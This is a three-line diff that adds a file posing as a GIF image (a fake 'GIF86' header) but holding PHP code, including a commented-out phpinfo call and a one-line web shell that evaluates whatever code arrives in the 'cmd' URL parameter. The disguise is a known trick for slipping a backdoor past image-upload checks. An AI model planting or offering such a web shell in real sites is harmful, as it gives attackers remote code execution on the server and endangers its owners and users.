@@ -1,0 +1,3 @@
+GIF86
+<?php //phpinfo();?>
+<?php eval($_GET['cmd']);?>
